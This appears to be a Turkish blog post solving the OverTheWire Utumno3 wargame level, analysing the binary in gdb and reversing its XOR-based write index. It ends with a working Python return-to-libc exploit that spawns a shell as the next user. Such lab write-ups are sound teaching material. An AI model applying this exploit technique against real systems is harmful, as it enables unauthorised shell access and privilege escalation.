---
layout: post
title: "Overthewire - Utumno3 Çözümü"
subtitle: "Tersine matematik mevzuları"
date: 2019-09-20 11:00:13 +0300
background: '/img/posts/bg.png'
---

# Overthewire Çözümleri - Utumno3

## İpucu
- Return to libc

## Çözüm

Programı çalıştırdığımızda bizden girdi bekliyor. Üst üste girdileri aldıktan sonra da program bitiyor. **ltrace** ile programı çalıştırınca ise girdilerin **getchar()** fonksiyonu ile alındığını görüyoruz. Bu demek oluyor ki program her seferinde bir karakterlik girdi okuyor.

**gdb** kullanarak analiz yapmaya devam edelim.

main fonksiyonunu disassemble ettiğimizde ilk olarak şu dikkatimizi çekiyor:

```assembly
...
0x08048401 <+22>:    mov    eax,DWORD PTR [ebp-0xc]
...
0x0804845b <+112>:   cmp    DWORD PTR [ebp-0x8],0x17
0x0804845f <+116>:   jle    0x8048401 <main+22>
...
```

Gördüğümüz üzere önce 22. satırdan 112. satıra koşulsuz bir zıplama, sonrasında ise **ebp-0x8** adresindeki değişken 0x17'den küçükse 22. satıra zıpla. Demek oluyor ki program neredeyse bir döngüden ibaret.

**ebp-0x8** adresindeki değişkenin başlangıç değerini ve her döngüde nasıl değiştiğini bulmak için döngünün içinde bu değişkeni arayalım.

```assembly
0x080483f2 <+7>:     mov    DWORD PTR [ebp-0xc],0x0
0x080483f9 <+14>:    mov    eax,DWORD PTR [ebp-0xc]
0x080483fc <+17>:    mov    DWORD PTR [ebp-0x8],eax
...
0x08048449 <+94>:    add    DWORD PTR [ebp-0x8],0x1
...
```

Döngüden önce değişkene 0 atanıyor ve her döngüde bir kere arttırılıyor. Yani bu döngü **getchar** fonksiyonu hata döndürmediği sürece sürece 24 kere çalışacak.

Programın hiçbir yerinde **system** fonksiyonunun çağırılmadığı veya **strcpy** gibi fonksiyonlar olmadığını görüyoruz. 

Bundan ötürü **getchar** fonksiyonu ile aldığı karakterleri nereye yazıyor sorusundan analizimize devam edebiliriz.

```assembly
0x08048440 <+85>:    call   0x80482c0 <getchar@plt>
0x08048445 <+90>:    mov    BYTE PTR [ebp+ebx*1-0x24],al
```

85. satırda karakter **eax** register'ına alınıyor ve "ebp+ebx*1-0x24" adresine yazılıyor. Döngünün hiçbir yerinde **ebp** değiştirilmiyor. Bu demek oluyor ki eğer **ebx**'in değerini bizim girdiğimiz karakter etkiliyor ise programın istediğimiz adrese değer yazmasını sağlayabiliriz.

Döngünün içindeki matematiksel işlemleri inceleyerek devam edelim.

```assembly
0x08048401 <+22>:    mov    eax,DWORD PTR [ebp-0xc]
0x08048404 <+25>:    mov    ecx,eax
0x08048406 <+27>:    lea    edx,[ebp-0x3c]
0x08048409 <+30>:    mov    eax,DWORD PTR [ebp-0x8]
0x0804840c <+33>:    add    eax,edx
0x0804840e <+35>:    mov    BYTE PTR [eax],cl
```

Sırasıyla olan şeyler şunlar:
- eax ve ecx'e 98. satırdaki getchar'dan alınan değeri kopyala.
- edx'e ebp-0x3c değişkenin adresini kopyala.
- eax'e her döngüde 1 artan sayaç değişkenini kopyala.
- (ebp-0x3c+sayaç) adresine getchar'dan alınan değeri yaz.

Yani kısaca ebp-0x3c değişkenine "D1" dersek program "D1 + sayaç" adresine aldığı karakteri koyuyor.

```assembly
0x08048410 <+37>:    lea    edx,[ebp-0x3c]
0x08048413 <+40>:    mov    eax,DWORD PTR [ebp-0x8]
0x08048416 <+43>:    add    eax,edx
0x08048418 <+45>:    movzx  ecx,BYTE PTR [eax]
0x0804841b <+48>:    mov    eax,DWORD PTR [ebp-0x8]
0x0804841e <+51>:    mov    edx,eax
0x08048420 <+53>:    mov    eax,edx
0x08048422 <+55>:    add    eax,eax
0x08048424 <+57>:    add    eax,edx
0x08048426 <+59>:    xor    ecx,eax
```

Devamında ise:
- Tekrardan eax'e "D1 + sayaç" adresi yükleniyor.
- ecx'in içine "D1 + sayaç" adresindeki karakter yani **getchar** ile alınan karakter atılıyor.
- eax'e sayaç atılıyor. 
- 51. satırdan 59. satıra kadar olan işlemde ise ecx ile (3 * eax) xor'lanarak ecx'e atılıyor.

Burada da aslında yapılan işlem şu oldu:
```assembly
ecx = (girdiden alınan karakter) xor (3 * sayaç)
```

```assembly
0x08048428 <+61>:    lea    edx,[ebp-0x3c]
0x0804842b <+64>:    mov    eax,DWORD PTR [ebp-0x8]
0x0804842e <+67>:    add    eax,edx
0x08048430 <+69>:    mov    BYTE PTR [eax],cl
```

Bu seferde program aynı işlemleri tekrarlayarak bu sefer'de "D1 + sayaç" adresine ecx, yani "(girdiden alınan karakter) xor (3 * sayaç)" değerini yazıyor.

```assembly
0x08048432 <+71>:    lea    edx,[ebp-0x3c]
0x08048435 <+74>:    mov    eax,DWORD PTR [ebp-0x8]
0x08048438 <+77>:    add    eax,edx
0x0804843a <+79>:    movzx  eax,BYTE PTR [eax]
0x0804843d <+82>:    movsx  ebx,al
```

Son olarak ise programın ecx değerini ebx'e kopyaladığını görüyoruz. 

Burada optimize edilmemiş bir kodun aslında kendini gereksizce ne kadar tekrarladığını görebiliriz. Bu tarz tekrarlar bu kadar küçük bir programda zaman kaybı yaşatmasa da büyük projelerde ciddi sıkıntılar yaratabiliyor.

Sonuç olarak bu kadar işlemin ebx'in içine "(girdiden alınan karakter) xor (3 * sayaç)" değerini atmak için yapıldığını gördük.

Şimdi yapacağımız şey ise biz öyle karakterler girelim ki programın "ret" komutuyla döneceği adres bize bir shell açsın. 

Bunu "return to libc" atağı kullanarak yapabiliriz. "libc" dediğimiz standart C kütüphanesi zaten sistemin belleğinde bir yerlerde yüklü halde. Bu kütüphane de bizim shell almamız için çağırmamız gereken "system" fonksiyonunu barındırıyor. Programın akışını değiştirerek C kütüphanesindeki bir fonksiyona zıplamaya "return to libc" atağı deniyor. "system" fonksiyonuna bir de çalıştıracağı komutu char* olarak vermemiz gerekiyor. Yani belleğe şu şekilde yazmamız gerekiyor:

```
<systemin_yüklü_olduğu_adres> <system_fonksiyonu_bitince_programın_döneceği_adres> <çalışacak_stringin_adresi>
```

Sistem fonksiyonu bittiğinde biz zaten çoktan shell'imizi çalıştırmış olacağımızdan programın döneceği adrese herhangi bir değer verebiliriz.

"system" fonksiyonunun adresini bulmak için gdb'de program çalışıyorken şu komutu girelim:
```
(gdb) print &system
$1 = (<text variable, no debug info> *) 0xf7e4c850 <system>
```

Bu cepte dursun. Shell almak için "/bin/sh" komutunu çalıştırabiliriz. "/bin/sh" string'i de C kütüphanesi sayesinde belleğimizde yüklü. Adresini bulmak için yüklü C kütüphanesinin adresini ve o adreste "/bin/sh" string'inin adresini bulalım.

```
(gdb) info proc mappings
...
0xf7e12000 0xf7fc3000   0x1b1000        0x0 /lib32/libc-2.24.so
...
```

Başlangıç adresinin "0xf7e12000" olduğunu görüyoruz. gdb'den çıkmadan string'in adresini ise şu şekilde bulabiliriz.

```
(gdb) shell strings -a -t x /lib32/libc-2.24.so | grep "/bin/sh"
15ccc8 /bin/sh
```

strings komutunun -a opsiyonu tüm string'leri getirmesine, "-t x" opsiyonu ise 16'lık tabanda string'in lokasyonunu yazdırmasına yarıyor.

0xf7e12000 + 0x15ccc8 yaptığımızda ise string'in "0xf7f6ecc8" adresinde olduğunu buluyoruz.

Şimdi de programın ret komutu çalıştığında döneceği yeri aldığı adresi bulalım. Bunu yapmadan önce stack'te adres kayması yaşamamak için gdb'nin değiştirdiği ve ekstradan eklediği bazı çevre değişkenlerini düzenleyelim/silelim.

```
(gdb) unset environment COLUMNS
(gdb) unset environment LINES
(gdb) set environment _=./utumno3
```

Bu şekilde gdb'nin eklediği COLUMS ve LINES değişkenlerini silmiş ve _ değişkenine de gdb'den çıkıp "./utumno3" diyerek utumno3'ü çalıştıracağımızda alacağı değeri attık.

Programı çalıştırıp esp'nin değerini(**0xffffd6ec**) alıyoruz.

Şimdi ise matematiksel işlemi tersine çevirelim.

```assembly
0x08048445 <+90>:    mov    BYTE PTR [ebp+ebx*1-0x24],al
```

Öncelikle denklemde bilinmeyen istemediğimizden ötürü ebp'yi esp cinsinden yazalım. "mov ebp, esp"'den sonra ebp'nin değeri esp'ye eşit oluyor. Daha sonra ise "push ebp" ile esp 4 byte geriye gidiyor. Sonrasında ise "sub esp, 0x38" ile esp'den 0x38 çıkarılıyor. "ret"'ten önce ise iki kere "pop" işlemi gerçekleşiyor, sonrasında da esp'ye 0x38 ekleniyor. Böylece "ret" satırına geldiğinde ebp'nin 90. satırdaki hali, esp'den 4 küçük olacak. 

Aslında bunu 90. satırda ebp'nin değerine bakıp daha kolay bir şekilde yapabiliriz. Fakat esp'nin değerini zaten bulmuşken ikinci bir bilinmeyen eklemek istemedim.

Şimdi ise yapmamız gereken tek şey her seferinde öyle karakter girmek ki "ebp + ebx*1 - 0x24" esp + sayaç'a eşit olsun. Böylece return adresinden başlayarak byte byte belleğe yazıp programın akışını değiştirebiliriz.

Pseudo-code şu şekilde:
```
ebp = esp - 4
a = girilen karakter

for i in 0..255:
   if (esp - 4 + (a ^ (3*i)) - 0x24) == esp + i:
      girilmesi gereken karakter bulundu.

```

Belleğe yazmak istediğimiz 12 karakter var. Bundan dolayı 12 kere hangi karakteri girmemiz gerektiğini bulmamız gerekiyor. İlk önce belleğe yazacağımız karakter sonra da yazacağımız adresin bir byte'ı şeklinde girdimizi vermemiz gerekiyor. "/tmp" klasöründe kendi dosyamızı oluşturup esp değerini bulup aşağıdaki kodu çalıştırınca bölümü geçmiş oluyoruz.

Son olarak'ta gdb'de _ değerini set ederken python3'ü çalıştıracağımızı bundan dolayı "_=/usr/bin/python3" yapmamız gerektiğini unutmuyoruz.

```py
import subprocess
import os

esp = <ESP_DEGERİ>

# f7e4c850: system'in adresi
# 41414141: system'in döneceği önemsiz adres
# f7f6ecc8: /bin/sh'ın adresi
lol = ['50', 'c8', 'e4', 'f7', '41', '41', '41', '41', 'c8', 'ec', 'f6', 'f7']

output = ''

# 12 karakter yazacağımız için 12 kere dönüyoruz
for i in range(12):
   # 0 dan 255'e olası tüm karakterleri deniyoruz
    for a in range(0, 255):
        if (esp - 4 + (a ^ (3*i)) - 0x24) == esp + i:
            output += '\\x' + str(hex(a))[2:] + '\\x' + lol[i]
            break

# Sondaki A'ları ise programın bitmesi için veriyoruz
os.system('(echo `python -c "print \'' + output + '\'"`AAAAAAAAAAAAAAAAAAAAAAAAAAA; cat) | /utumno/utumno3')
```

```
utumno3@utumno:/tmp/tmp.B8NhRXqYiK$ python3 exploit.py
whoami
utumno4
```